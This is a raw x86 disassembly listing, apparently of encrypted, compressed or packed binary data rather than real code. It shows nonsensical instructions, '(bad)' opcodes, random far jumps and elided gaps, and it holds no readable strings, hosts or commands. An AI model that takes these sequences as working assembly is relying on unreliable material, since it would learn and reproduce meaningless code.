  4146db:	es inc eax
  4146dd:	mov    esi,0xf1bcee4c
  4146e2:	into   
  4146e3:	inc    eax
  4146e4:	dec    esi
  4146e5:	les    esp,FWORD PTR [ecx+0x9]
  4146e8:	js     0x414722
  4146ea:	int    0xb
  4146ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146ed:	cli    
  4146ee:	jmp    0x41470b
  4146f0:	xlat   BYTE PTR ds:[ebx]
  4146f1:	add    BYTE PTR [ecx-0x36],0x53
  4146f5:	into   
  4146f6:	and    ecx,ecx
  4146f8:	popf   
  4146f9:	out    0x57,eax
  4146fb:	push   esi
  4146fc:	dec    edx
  4146fd:	dec    edi
  4146fe:	jne    0x41468f
  414700:	push   esi
  414701:	sub    DWORD PTR ss:[edi+ebx*4-0x81cc7f9],edx
  414709:	mov    eax,ds:0x2786661
  41470e:	xor    ebp,DWORD PTR [esi+ebp*4-0x1354aa06]
  414715:	dec    eax
  414716:	mov    cl,0xf9
  414718:	(bad)  
  414719:	jmp    0x25cd:0x44b72b34
  414720:	test   eax,0xd26b6aa2
  414725:	push   ds
  414726:	retf   
  414727:	in     al,dx
  414728:	push   es
  414729:	pop    edx
  41472a:	adc    al,0x4e
  41472c:	sbb    ebp,DWORD PTR [ebx+0x75]
  41472f:	or     DWORD PTR [esp+ebp*4],edx
  414732:	and    bl,bl
  414734:	pop    eax
  414735:	xchg   edi,eax
  414736:	in     eax,dx
  414737:	cmp    ebx,DWORD PTR [ebp-0x48]
  41473a:	popf   
  41473b:	sub    bh,BYTE PTR [esi]
  41473d:	std    
  41473e:	fst    QWORD PTR [ebx+eiz*1]
  414741:	lea    edi,[ebx+ebx*8-0x5f]
  414745:	pop    esi
  414746:	and    DWORD PTR [ebx-0x508af7c5],ebx
  41474c:	adc    DWORD PTR [eax+0x7],ebp
  41474f:	in     al,dx
  414750:	add    DWORD PTR [esi+ebp*1],ebx
  414753:	xor    al,0xb5
  414755:	or     DWORD PTR [edi-0x68],edi
  414758:	div    ecx
  41475a:	fxch   st(4)
  41475c:	js     0x4147ca
  41475e:	enter  0x7cd6,0x4
  414762:	push   edi
  414763:	jmp    0x414705
  414765:	ins    BYTE PTR es:[edi],dx
  414766:	ds cld 
  414768:	cmp    ch,BYTE PTR [ecx]
  41476a:	inc    edi
  41476b:	(bad)
  41476e:	sub    ecx,DWORD PTR [edx-0x44dcf019]
  414774:	int    0xa9
  414776:	mov    ebp,0x3b412b14
  41477b:	outs   dx,DWORD PTR ds:[esi]
  41477c:	inc    edx
  41477d:	mov    bh,0x17
  41477f:	test   DWORD PTR [ebp+0x49fc3515],edi
  414785:	inc    ebp
  414786:	sti    
  414787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414788:	jge    0x4147ad
  41478a:	ins    BYTE PTR es:[edi],dx
  41478b:	jp     0x4147ea
  41478d:	cmp    DWORD PTR [esi],0x2d
	...
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xacdd701a
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	dec    esi
  41480d:	jge    0x414803
  41480f:	jg     0x41482c
  414811:	push   eax
  414812:	pop    esi
  414813:	push   cs
  414814:	mov    BYTE PTR [esp+eax*8],dl
  414817:	in     al,dx
  414818:	xor    ah,BYTE PTR [eax]
  41481a:	std    
  41481b:	cmp    al,0xc6
  41481d:	mov    ebp,0xa43049bd
  414823:	es scas al,BYTE PTR es:[edi]
  414825:	dec    esp
  414826:	jp     0x4147ba
  414828:	xchg   DWORD PTR [edx+0x3ae2e1e5],eax
  41482e:	adc    cl,bh
  414830:	ror    DWORD PTR [edx+0x36],1
  414833:	out    0x8e,eax
  414835:	sub    edi,DWORD PTR [edi-0x48]
  414838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414839:	jge    0x414831
  41483b:	aad    0x25
  41483d:	mov    dh,0x54
  41483f:	jbe    0x414836
  414841:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414843:	push   esp
  414844:	mov    dl,0xdf
  414846:	push   cs
  414847:	sub    al,0xec
  414849:	jmp    0xd256:0xb955d712
  414850:	adc    bh,BYTE PTR ds:0xeb987a8b
  414856:	(bad)  
  414857:	push   ebp
  414858:	push   ss
  414859:	sub    BYTE PTR [esi+0x67],0xb5
  41485d:	(bad)  
  41485e:	repnz int3 
  414860:	out    dx,eax
  414861:	mov    bl,0xe5
  414863:	mov    ch,0x83
  414865:	neg    DWORD PTR [edi]
  414867:	xchg   ecx,eax
  414868:	jnp    0x414878
  41486a:	pusha  
  41486b:	and    BYTE PTR [ebx],0x72
  41486e:	pop    ebx
  41486f:	stos   BYTE PTR es:[edi],al
  414870:	fwait
  414871:	pop    ds
  414872:	out    0x4e,eax
  414874:	pop    esp
  414875:	scas   al,BYTE PTR es:[edi]
  414876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414877:	test   dl,0xd2
  41487a:	adc    DWORD PTR [eax+0x695ba963],ebp
  414880:	jecxz  0x414828
  414882:	push   0x9ccda9c1
  414887:	(bad)  
  414888:	fwait
  414889:	xchg   DWORD PTR [edi+edx*4+0x7ffd036c],esi
  414890:	mov    al,0xde
  414892:	dec    eax
  414893:	and    esp,DWORD PTR [edi+0x4c]
  414896:	popf   
  414897:	sbb    dl,dl
  414899:	fnstenv [ecx-0x5e]
  41489c:	mov    ecx,0xb3670e2
  4148a1:	shl    BYTE PTR [edi+0x7a82b57c],0x34
  4148a8:	jmp    0xfd71:0x6e5e8f2a
  4148af:	push   ss
  4148b0:	jns    0x41483b
  4148b2:	pop    ecx
  4148b3:	pop    ecx
  4148b4:	sbb    esp,DWORD PTR [ebp+0x53]
  4148b7:	xchg   ebx,eax
  4148b8:	adc    bl,BYTE PTR [edi]
  4148ba:	push   es
  4148bb:	push   cs
  4148bc:	mov    eax,DWORD PTR [esi]
  4148be:	dec    ecx
  4148bf:	or     ah,BYTE PTR [esi+0x2b]
  4148c2:	dec    edx
  4148c3:	xor    al,0xbb
  4148c5:	sbb    BYTE PTR [esi],cl
  4148c7:	pusha  
  4148c8:	mov    cl,BYTE PTR [ebx-0xc]
  4148cb:	arpl   WORD PTR [ebx],bp
  4148cd:	mov    al,BYTE PTR [ebx+0x7ceca146]
  4148d3:	imul   edx,DWORD PTR [edx+0x1c20ef83],0x38068daa
  4148dd:	mov    eax,ds:0x2dbd63a2
  4148e2:	les    edx,FWORD PTR [edx+0x3e9fa695]
  4148e8:	jl     0x4148b5
  4148ea:	jns    0x41488f
  4148ec:	ds adc eax,0xcb24bca1
  4148f2:	je     0x414964
  4148f4:	mov    esp,0x122d62fc
  4148f9:	jle    0x41488f
  4148fb:	in     al,0x84
  4148fd:	add    DWORD PTR [ebp-0x6b],ebx
  414900:	mov    esi,0x89a8d59f
  414905:	jo     0x41494c
  414907:	mov    ebx,0x72c702c9
  41490c:	test   al,0x22
  41490e:	inc    eax
  41490f:	data16 add BYTE PTR [eax],al
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	mov    ebx,0xf8850349
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	xchg   edi,eax
  41498d:	push   ds
  41498e:	popa   
  41498f:	(bad)  
  414990:	adc    bh,ah
  414992:	sub    al,0xf1
  414994:	(bad)  
  414995:	sbb    eax,0xcafef5cc
  41499a:	xor    ch,dl
  41499c:	ins    BYTE PTR es:[edi],dx
  41499d:	into   
  41499e:	stos   DWORD PTR es:[edi],eax
  41499f:	sbb    cl,BYTE PTR [esi+eiz*2-0x7ee841e4]
  4149a6:	and    al,0xe
  4149a8:	jae    0x4149b5
  4149aa:	mov    cl,0x9b
  4149ac:	ret    
  4149ad:	sti    
  4149ae:	jl     0xac272cdf
  4149b4:	sbb    eax,0x67bff5af
  4149b9:	dec    esp
  4149ba:	jae    0x4149bf
  4149bc:	aad    0x8e
  4149be:	ins    BYTE PTR es:[edi],dx
  4149bf:	js     0x41496a
  4149c1:	ins    BYTE PTR es:[edi],dx
  4149c2:	adc    eax,0x176190fb
  4149c7:	dec    esp
  4149c8:	fld    TBYTE PTR [ebx]
  4149ca:	sbb    DWORD PTR [esi+0x75],eax
  4149cd:	cmp    ch,dh
  4149cf:	add    al,0x94
  4149d1:	mov    dl,0xb5
  4149d3:	xor    DWORD PTR [ecx+0x39],esi
  4149d6:	xchg   edx,eax
  4149d7:	dec    ebx
  4149d8:	sbb    ecx,0x1a
  4149db:	outs   dx,BYTE PTR ds:[esi]
  4149dc:	(bad)  
  4149dd:	(bad)  
  4149df:	shr    DWORD PTR [edi+0x6c14f5c6],1
  4149e5:	jp     0x414a5b
  4149e7:	retf   0x7b3d
  4149ea:	lods   al,BYTE PTR ss:[esi]
  4149ec:	cmc    
  4149ed:	shl    cl,0x15
  4149f0:	in     al,dx
  4149f1:	jl     0x4149f2
  4149f3:	lea    eax,[ebx+0x14]
  4149f6:	sbb    eax,0x93a5d840
  4149fb:	sbb    DWORD PTR [esi],esp
  4149fd:	sub    eax,0xe533aa80
  414a02:	setne  BYTE PTR [eax-0x17]
  414a06:	lods   al,BYTE PTR ds:[esi]
  414a07:	jg     0x414a2f
  414a09:	adc    ecx,ebp
  414a0b:	test   DWORD PTR [ecx-0x299dfe45],ebx
  414a11:	hlt    
  414a12:	and    edx,DWORD PTR [eax-0x2d69e536]
  414a18:	(bad)  
  414a19:	retf   
  414a1a:	pushf  
  414a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a1c:	mov    edx,?
  414a1e:	(bad)  
  414a1f:	dec    esp
  414a20:	inc    edi
  414a21:	inc    edx
  414a22:	fs dec esp
  414a24:	mov    WORD PTR [ecx],gs
  414a26:	leave  
  414a27:	jnp    0x414a72
  414a29:	xchg   ebx,eax
  414a2a:	retf   
  414a2b:	clc    
  414a2c:	js     0x414a63
  414a2e:	jmp    0xff1b4e55
  414a33:	jmp    0x3724c4f7
  414a38:	push   edx
  414a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a3a:	cmp    dl,ah
  414a3c:	jbe    0x414a02
  414a3e:	scas   eax,DWORD PTR es:[edi]
  414a3f:	lods   al,BYTE PTR ds:[esi]
  414a40:	inc    edx
  414a41:	push   0xffffff8b
  414a43:	cmp    al,0x6e
  414a45:	push   esp
  414a46:	add    BYTE PTR [ecx],0xf2
  414a49:	jnp    0x414a04
  414a4b:	std    
  414a4c:	movzx  ebx,BYTE PTR [ebx+0x7cd14997]
  414a53:	fnstsw WORD PTR fs:[edi-0xd8b310c]
  414a5a:	stos   DWORD PTR es:[edi],eax
  414a5b:	test   al,0x32
  414a5d:	or     ecx,DWORD PTR [edx-0x2]
  414a60:	fwait
  414a61:	pop    ebp
  414a62:	pop    ebx
  414a63:	outs   dx,BYTE PTR ds:[esi]
  414a64:	sbb    DWORD PTR [edi+0x40],ebx
  414a67:	addr16 retfw 0x95a4
  414a6c:	fild   DWORD PTR [ebp+0x3072cd0f]
  414a72:	mov    ebp,DWORD PTR [edx]
  414a74:	and    esi,DWORD PTR [ecx+0x8]
  414a77:	xchg   edi,eax
  414a78:	cs inc esi
  414a7a:	call   0xedf0:0xa7bfd238
  414a81:	jle    0x414ab3
  414a83:	or     eax,esi
  414a85:	cmp    ecx,DWORD PTR [ecx-0x10]
  414a88:	ja     0x414af1
  414a8a:	(bad)  
  414a8b:	cdq    
  414a8c:	cmp    esp,DWORD PTR [ebx+0x216f]
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x3d2b9c27]
  414b02:	and    dh,ah
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	retf   
  414b0d:	in     eax,dx
  414b0e:	pop    ecx
  414b0f:	lea    esi,[esi-0xd41b117]
  414b15:	adc    eax,0xaa2a822a
  414b1a:	rcl    BYTE PTR [esp+edi*1-0x3b],cl
  414b1e:	call   0xa235:0x8ac9a60d
  414b25:	xchg   DWORD PTR [ebx+0x3f34532e],edx
  414b2b:	(bad)  
  414b2c:	and    BYTE PTR [ebx+0x37],cl
  414b2f:	mov    ebp,0xeadc1f7c
  414b34:	ret    0xb735
  414b37:	push   ecx
  414b38:	mov    ds:0x4ea549e0,al
  414b3d:	mov    eax,ds:0xd5b0af7e
  414b42:	dec    ebx
  414b43:	push   ecx
  414b44:	cmp    DWORD PTR [edi],0x3fd5cb2f
  414b4a:	je     0x414bae
  414b4c:	retf   
  414b4d:	inc    eax
  414b4e:	mov    dl,0xe8
  414b50:	pop    ss
  414b51:	dec    edx
  414b52:	sbb    DWORD PTR [ebx+ebx*2],eax
  414b55:	dec    eax
  414b56:	arpl   bx,bp
  414b58:	inc    ecx
  414b59:	add    DWORD PTR [edx+0x63],esi
  414b5c:	adc    DWORD PTR [ebp-0x39156ee4],edi
  414b62:	sbb    BYTE PTR [ecx+0xc],0x9a
  414b66:	mov    edx,0x8be3b037
  414b6b:	xor    bl,BYTE PTR [esi]
  414b6d:	data16 adc dl,dh
  414b70:	push   0x5660cce0
  414b75:	lods   al,BYTE PTR ds:[esi]
  414b76:	test   al,0xa5
  414b78:	ror    bh,cl
  414b7a:	fwait
  414b7b:	fwait
  414b7c:	xor    BYTE PTR [esi+0x79dae733],ah
  414b82:	adc    edx,ecx
  414b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b85:	mov    ds:0xaa63651b,eax
  414b8a:	xchg   esi,eax
  414b8b:	xchg   BYTE PTR [eax+0x1c],ah
  414b8e:	jae    0x414b58
  414b90:	dec    esi
  414b91:	retf   0x6565
  414b94:	mov    cl,0x5f
  414b96:	xchg   BYTE PTR [edi],al
  414b98:	mov    edi,0xb4d1a86
  414b9d:	repnz xor al,0xd4
  414ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ba1:	je     0x414bb3
  414ba3:	push   edi
  414ba4:	or     bh,al
  414ba6:	test   DWORD PTR [ebx-0x462a2809],edx
  414bac:	stos   DWORD PTR es:[edi],eax
  414bad:	jne    0x414ba2
  414baf:	jns    0x414b5a
  414bb1:	push   esp
  414bb2:	sub    al,0xb0
  414bb4:	xor    DWORD PTR [ebp+0x5a],ebp
  414bb7:	mov    BYTE PTR [esi+0x24],0x43
  414bbb:	pop    ss
  414bbc:	jle    0x414c0c
  414bbe:	xor    DWORD PTR [edx],ecx
  414bc0:	out    dx,eax
  414bc1:	pop    edx
  414bc2:	lahf   
  414bc3:	inc    edx
  414bc4:	cmp    DWORD PTR [esi],esp
  414bc6:	and    ebp,DWORD PTR [esi+ebx*4-0x7f19a9e4]
  414bcd:	mov    edi,0x7e5dc21d
  414bd2:	pushf  
  414bd3:	cmp    ebp,DWORD PTR [edx-0x5a]
  414bd6:	mov    dl,0x50
  414bd8:	ror    al,cl
  414bda:	std    
  414bdb:	iret   
  414bdc:	xchg   ch,dh
  414bde:	mov    edi,0xcdd28bfb
  414be3:	xor    al,cl
  414be5:	and    bl,0x8d
  414be8:	mov    BYTE PTR [edi-0x19c04257],al
  414bee:	sub    esi,0x9d851b87
  414bf4:	test   DWORD PTR [edi+0xe],ecx
  414bf7:	lock pop ds
  414bf9:	gs jmp 0x414c46
  414bfc:	dec    esp
  414bfd:	inc    ebx
  414bfe:	sbb    eax,DWORD PTR [eax+0x5624f29b]
  414c04:	add    al,0xaa
  414c06:	push   ss
  414c07:	aaa    
  414c08:	iret   
  414c09:	add    al,0xa
  414c0b:	fsubr  st,st(6)
  414c0d:	stos   DWORD PTR es:[edi],eax
  414c0e:	loop   0x414bca
	...
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    edi,DWORD PTR cs:[ebx-0x25]
  414c82:	jno    0x414c07
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	stc    
  414c8d:	rsqrtps xmm7,XMMWORD PTR [edi]
  414c90:	arpl   bx,ax
  414c92:	sahf   
  414c93:	shr    eax,1
  414c95:	xchg   BYTE PTR [eax+ecx*8],ah
  414c98:	or     DWORD PTR [edi-0x54fc677],0x49
  414c9f:	getsec 
  414ca1:	int    0x30
  414ca3:	push   edi
  414ca4:	or     al,0x45
  414ca6:	cmp    BYTE PTR [edi+0x670d4ed7],ah
  414cac:	sbb    DWORD PTR [ebp-0x79],edx
  414caf:	daa    
  414cb0:	adc    dh,dh
  414cb2:	in     eax,0x9f
  414cb4:	pushf  
  414cb5:	mov    ecx,ecx
  414cb7:	and    al,BYTE PTR ds:0x4803c9fe
  414cbd:	stc    
  414cbe:	pop    edi
  414cbf:	sub    ebp,DWORD PTR [edi]
  414cc1:	fild   QWORD PTR [edi]
  414cc3:	(bad)  
  414cc4:	adc    ebx,DWORD PTR [edi+0x54]
  414cc7:	inc    eax
  414cc8:	loope  0x414c89
  414cca:	xchg   edi,eax
  414ccb:	dec    eax
  414ccc:	retf   
  414ccd:	dec    esi
  414cce:	mov    ch,0x1a
  414cd0:	retf   0x6043
  414cd3:	mov    ds:0xf0b5c50b,al
  414cd8:	mov    ch,0xd8
  414cda:	push   ecx
  414cdb:	clc    
  414cdc:	jb     0x414cbc
  414cde:	xor    bl,BYTE PTR [ecx-0x6b]
  414ce1:	push   es
  414ce2:	jmp    0x414cb5
  414ce4:	push   0xffffff97
  414ce6:	lahf   
  414ce7:	sbb    esi,0xfbeebec0
  414ced:	sbb    BYTE PTR [ecx+ebx*1],dl
  414cf0:	mov    dh,0x86
  414cf2:	and    al,BYTE PTR [edi-0x406244a]
  414cf8:	mov    eax,ds:0x1ec467a8
  414cfd:	fadd   QWORD PTR [edx-0x3f643766]
  414d03:	mov    BYTE PTR [ecx+edx*1],al
  414d06:	xlat   BYTE PTR ds:[ebx]
  414d07:	jmp    0xec5a:0x1b900ace
  414d0e:	and    BYTE PTR [ebp-0x46],bh
  414d11:	nop
  414d12:	stos   BYTE PTR es:[edi],al
  414d13:	jmp    0x7bb9a062
  414d18:	sbb    edx,DWORD PTR [esi-0x27]
  414d1b:	inc    edi
  414d1c:	add    al,0x89
  414d1e:	repnz pop esi
  414d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d21:	int3   
  414d22:	aad    0xc9
  414d24:	pushf  
  414d25:	imul   ebx,DWORD PTR [edi+0x57],0xffffffd6
  414d29:	dec    ecx
  414d2a:	mov    bl,0x8f
  414d2c:	inc    eax
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	push   ds
  414d2f:	repz mov cl,0xc5
  414d32:	mov    edx,DWORD PTR [edi+0x36f0f026]
  414d38:	out    dx,eax
  414d39:	xor    eax,0x5ee852b5
  414d3e:	out    dx,al
  414d3f:	xchg   edi,eax
  414d40:	adc    eax,0xd3d1b890
  414d45:	icebp  
  414d46:	sub    eax,DWORD PTR [esi+0x49]
  414d49:	cdq    
  414d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d4b:	mov    WORD PTR ds:0x7dc4cbe3,ds
  414d51:	add    edi,DWORD PTR [edi]
  414d53:	add    BYTE PTR [edi+0x12],0xd4
  414d57:	dec    eax
  414d58:	jbe    0x414d79
  414d5a:	push   edi
  414d5b:	jbe    0x414d3a
  414d5d:	dec    ebx
  414d5e:	rcl    DWORD PTR [edx+ecx*2],cl
  414d61:	mov    ch,0x3
  414d63:	xor    bh,BYTE PTR [edi+0x263dadc6]
  414d69:	sub    BYTE PTR [esp+edi*2+0x6de1f543],bh
  414d70:	(bad)  
  414d73:	jg     0x414d16
  414d75:	push   es
  414d76:	xlat   BYTE PTR ds:[ebx]
  414d77:	mov    cl,bh
  414d79:	imul   edi,DWORD PTR [ecx-0x8d3c896],0xbc8fa115
  414d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d84:	ficomp DWORD PTR [edx]
  414d86:	jmp    0x414d9b
  414d88:	mov    dl,0x1c
  414d8a:	sar    BYTE PTR [esi+0x367a208c],cl
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xc6138606
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	mov    eax,ds:0xb3bede
  414e11:	aad    0x57
  414e13:	call   0x37c71498
  414e18:	popf   
  414e19:	ror    DWORD PTR [edx-0x56],0x71
  414e1d:	mov    ch,0x60
  414e1f:	inc    esp
  414e20:	stos   BYTE PTR es:[edi],al
  414e21:	in     al,dx
  414e22:	pop    edx
  414e23:	(bad)  
  414e24:	nop
  414e25:	xor    ah,BYTE PTR [edx+0x63]
  414e28:	cli    
  414e29:	xchg   edx,eax
  414e2a:	pop    esp
  414e2b:	fnstcw WORD PTR [ebp+0xe]
  414e2e:	bound  ebx,QWORD PTR [edi+0xadf738e]
  414e34:	fadd   QWORD PTR [edx+0x16]
  414e37:	sub    DWORD PTR [ebx-0x7201ceba],esi
  414e3d:	adc    eax,0xbe8d5ce9
  414e42:	push   eax
  414e43:	lds    edx,FWORD PTR ds:0x1a482cde
  414e49:	retf   
  414e4a:	cmc    
  414e4b:	and    bh,ch
  414e4d:	mov    ebx,0xecdaba29
  414e52:	sbb    BYTE PTR [ebx+0x72],ch
  414e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e56:	or     ecx,DWORD PTR [ecx-0x73]
  414e59:	mov    DWORD PTR ds:0x1b32dd2b,edx
  414e5f:	ins    BYTE PTR es:[edi],dx
  414e60:	xchg   ebx,eax
  414e61:	scas   eax,DWORD PTR es:[edi]
  414e62:	int3   
  414e63:	dec    edx
  414e64:	imul   ebp,DWORD PTR [esi],0xffffff82
  414e67:	clc    
  414e68:	stc    
  414e69:	push   esi
  414e6a:	mov    dl,0x76
  414e6c:	aad    0x18
  414e6e:	(bad)  
  414e6f:	pop    ds
  414e70:	int    0x3b
  414e72:	xor    ebp,edi
  414e74:	adc    DWORD PTR [edi-0x3e],esp
  414e77:	sub    al,0xaa
  414e79:	cli    
  414e7a:	inc    edx
  414e7b:	call   0x9a121af3
  414e80:	add    edi,DWORD PTR [eax+0x3d6f912f]
  414e86:	xor    cl,BYTE PTR [ecx]
  414e88:	je     0x414e57
  414e8a:	(bad)  
  414e8b:	stos   DWORD PTR es:[edi],eax
  414e8c:	daa    
  414e8d:	int    0x2b
  414e8f:	dec    edi
  414e90:	xor    DWORD PTR [esi+edx*1+0x5ebe37d3],esi
  414e97:	cmp    DWORD PTR [ebp-0x2d],edx
  414e9a:	dec    ebp
  414e9b:	aas    
  414e9c:	jns    0x414e9a
  414e9e:	fcomp  QWORD PTR [esi+esi*4]
  414ea1:	loop   0x414f19
  414ea3:	fcmovnu st,st(0)
  414ea5:	jmp    0x414e49
  414ea7:	pop    es
  414ea8:	mov    ah,0xd8
  414eaa:	mov    ds:0x247a26b,al
  414eaf:	pop    edi
  414eb0:	or     ebx,DWORD PTR [ecx+0x0]
  414eb3:	test   al,0xea
  414eb5:	xor    ebp,DWORD PTR [edx-0x34]
  414eb8:	sbb    BYTE PTR ds:0x7a0e74be,0x4e
  414ebf:	clc    
  414ec0:	je     0x414ea8
  414ec2:	mov    dh,0x43
  414ec4:	push   0xb930162e
  414ec9:	mov    eax,ds:0xf2c2cb21
  414ece:	(bad)  
  414ecf:	cmp    ch,BYTE PTR ds:0xc07a2828
  414ed5:	jbe    0x414e79
  414ed7:	inc    ebp
  414ed8:	add    DWORD PTR [esi],esp
  414eda:	mov    ecx,0x97ca17ef
  414edf:	lea    edx,[ecx-0x1a]
  414ee2:	push   0x860ea7a8
  414ee7:	or     eax,0xf6aff4e0
  414eec:	mov    al,al
  414eee:	(bad)  
  414eef:	pushf  
  414ef0:	jno    0x414f5b
  414ef2:	sub    edi,edx
  414ef4:	addr16 cli 
  414ef6:	sahf   
  414ef7:	loop   0x414ecf
  414ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efa:	test   BYTE PTR [ebp+0x4b],ch
  414efd:	mov    cl,0x64
  414eff:	xchg   esp,eax
  414f00:	inc    ebx
  414f01:	sbb    al,0xdb
  414f03:	dec    edi
  414f04:	loop   0x414f84
  414f06:	mov    ch,0xd1
  414f08:	mov    ds:0x9ae6f,al
  414f0d:	cmp    eax,0xdd6d
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0xf2dee26f
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	retf   
  414f8d:	jmp    0x414f6e
  414f8f:	xchg   ecx,eax
  414f90:	push   esp
  414f91:	sbb    ebx,ecx
  414f93:	test   ecx,ecx
  414f95:	xchg   ax,ax
  414f97:	cmp    DWORD PTR [ebx-0x41],edx
  414f9a:	sub    DWORD PTR [ebx+0x3beae41b],edi
  414fa0:	stos   DWORD PTR es:[edi],eax
  414fa1:	xor    BYTE PTR [eax-0x6f],bl
  414fa4:	add    edx,DWORD PTR [edi+0x7a7b279d]
  414faa:	mov    gs,WORD PTR [ecx+ecx*4]
  414fad:	sbb    BYTE PTR [eax-0x47],al
  414fb0:	mov    al,0x21
  414fb2:	mov    al,ds:0x81eb6341
  414fb7:	mov    ds:0xb3bbf769,al
  414fbc:	or     ebp,esi
  414fbe:	add    ah,BYTE PTR [ecx-0x19]
  414fc1:	call   0xdbad:0x3e317bcc
  414fc8:	outs   dx,BYTE PTR ds:[esi]
  414fc9:	pop    esi
  414fca:	pop    ss
  414fcb:	mov    edi,0x5b0d456d
  414fd0:	ins    BYTE PTR es:[edi],dx
  414fd1:	jb     0x414fec
  414fd3:	retf   0xeea4
  414fd6:	iret   
  414fd7:	dec    esi
  414fd8:	in     al,0x69
  414fda:	cmp    esi,DWORD PTR [ebp+0x4cbbf11a]
  414fe0:	adc    BYTE PTR es:[ecx+0x2484c76f],al
  414fe7:	loop   0x415018
  414fe9:	xor    DWORD PTR [ecx+0x140065e7],esp
  414fef:	mov    ah,0x3b
  414ff1:	push   edx
  414ff2:	sbb    eax,0x4b584772
  414ff7:	and    edx,ebx
  414ff9:	pushf  
  414ffa:	xchg   al,bl
  414ffc:	pushf  
  414ffd:	or     esp,DWORD PTR [edx-0x47caaa46]
  415003:	outs   dx,DWORD PTR ds:[esi]
  415004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415005:	into   
  415006:	push   0xffffffee
  415008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415009:	nop
  41500a:	xor    bh,BYTE PTR [ebx+0x2983ea55]
  415010:	push   es
  415011:	cmp    BYTE PTR [esi+0x9],ch
  415014:	xor    eax,0xe2da04cd
  415019:	jno    0x41502f
  41501b:	repz mov dh,0x7e
  41501e:	fdivr  QWORD PTR [edx+0x127fa17c]
  415024:	stos   DWORD PTR es:[edi],eax
  415025:	sub    dl,BYTE PTR [ebx+0x6efd3342]
  41502b:	push   cs
  41502c:	or     edi,DWORD PTR [ecx-0x3d3167ed]
  415032:	mov    ch,0x88
  415034:	stc    
  415035:	mov    ecx,0x5c5cc54c
  41503a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503b:	test   BYTE PTR [ecx],cl
  41503d:	inc    ecx
  41503e:	icebp  
  41503f:	aaa    
  415040:	push   cs
  415041:	sti    
  415042:	loop   0x414ffa
  415044:	and    al,0x9b
  415046:	(bad)  
  415048:	retf   
  415049:	jmp    0xb2de:0xa2708687
  415050:	adc    eax,0x3bdf0caa
  415055:	adc    ch,bl
  415057:	pop    ebp
  415058:	cmc    
  415059:	repnz pop ecx
  41505b:	xchg   ebp,eax
  41505c:	mov    edx,0x83da979b
  415061:	and    BYTE PTR [edx-0x67],0x67
  415065:	xchg   ecx,eax
  415066:	ret    0xae04
  415069:	xchg   edx,eax
  41506a:	add    eax,0x2e304691
  41506f:	out    dx,eax
  415070:	pop    ebx
  415071:	lods   eax,DWORD PTR ds:[esi]
  415072:	sub    al,0x15
  415074:	inc    eax
  415075:	inc    edx
  415076:	mov    ah,0x33
  415078:	cwde   
  415079:	jmp    0x41507f
  41507b:	neg    BYTE PTR [ecx+0x478dc0ad]
  415081:	cmp    al,0x1f
  415083:	add    al,0xc4
  415085:	lahf   
  415086:	bound  eax,QWORD PTR [edi+0x60]
  415089:	sub    al,0xe3
  41508b:	inc    esp
  41508c:	xor    eax,edx
  41508e:	loope  0x4150dd
	...
  4150f4:	jnp    0x4150f8
